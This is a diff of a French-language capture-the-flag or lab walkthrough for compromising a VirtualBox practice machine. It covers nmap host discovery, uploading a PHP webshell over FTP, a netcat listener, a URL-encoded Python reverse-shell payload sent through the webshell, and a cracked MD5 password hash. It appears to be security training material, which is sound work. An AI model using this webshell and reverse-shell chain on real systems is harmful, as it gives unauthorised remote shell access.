@@ -1,7 +1,9 @@
 # 01-Local
 
 ## Télécharge et importe l'image de l'exercice dans virtualbox
-Modifie les données lors de l'importation selon la configuration de ta machine (ram, stockage, etc.)
+- Modifie les données lors de l'importation selon la configuration de ta machine (ram, stockage, etc.)
+- Ram: 4096MB
+- Réseau: Accés par pont (Bridge)
 
 ## Démarre la machine virtuelle
 Aprés modification des paramétres, démarre la machine virtuelle
@@ -12,7 +14,7 @@ Aprés modification des paramétres, démarre la machine virtuelle
 - Regarde wlan0
 - Puis la section inet
 ### Puis regarde les ip dispo sur ta machine avec ```nmap```
-- nmap -sn ```"ip"``` (en remplaçant le dernier nombre par ```"0/24"``` pour balayer les plages de cellules disponibles)
+- nmap -sn ```"ip"``` en remplaçant le dernier nombre par ```"0/24"``` pour balayer les plages de cellules disponibles (l'adresse hôte)
 - Regarder la machine virtuelle  qui est ouvert sur virtualbox
 - s'il y en a plusieurs, recherche d'abord l'adresse Mac et fais la commande suivante sur chaque adresse ip pour vérifier si l'adresse Mac correspond
     - nmap -sA "ip"
@@ -45,13 +47,13 @@ Aprés modification des paramétres, démarre la machine virtuelle
 
 ## Ajouter un webshell
 - Sortir du ftp
-- Créer un fichier webshell.php
+- Créer un fichier webshell.php (déja disponible dans le répertoire)
 - Entrer dans le ftp
 - Verser le fichier dans le ftp
     - put webshell.php
 
 ## Dans le terminal de ta machine physique
-- nc -lvnp 1234
+- nc -lvnp 4444
 
 ## Dans le navigateur
 - http://[ipVir]/files/webshell.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);%20s.connect((%22[ipPhy]%22,4444));%20os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);%20p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
@@ -136,7 +138,7 @@ echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
 - login: shrek
 - passwd (hash): 061fe5e7b95d5f98208d7bc89ed2d569
 
-## Vérifier le type de hash
+## Décrypter le hash
 - aller sur https://www.dcode.fr/fonction-hash
 - coller le hash 061fe5e7b95d5f98208d7bc89ed2d569
 - mot de passe trouvé: youaresmart
